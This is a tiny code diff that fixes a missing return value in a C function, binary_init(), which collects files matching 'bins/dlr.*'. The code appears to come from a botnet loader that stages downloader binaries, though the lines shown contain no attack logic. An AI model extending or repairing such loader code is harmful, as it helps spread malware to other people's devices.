@@ -16,7 +16,7 @@ BOOL binary_init(void)
 
 	if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
     {
-        return;
+        return FALSE;
     }
 
     for(i = 0; i < pglob.gl_pathc; i++)
